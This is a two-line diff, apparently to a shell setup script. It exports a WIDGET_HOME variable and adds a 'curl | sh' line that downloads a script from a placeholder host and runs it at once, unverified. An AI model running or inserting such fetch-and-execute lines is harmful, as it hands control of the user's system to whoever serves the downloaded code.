@@ -1,0 +1,2 @@
+export WIDGET_HOME="$PWD"
+curl -fsSL https://cdn.example.net/env.sh | sh
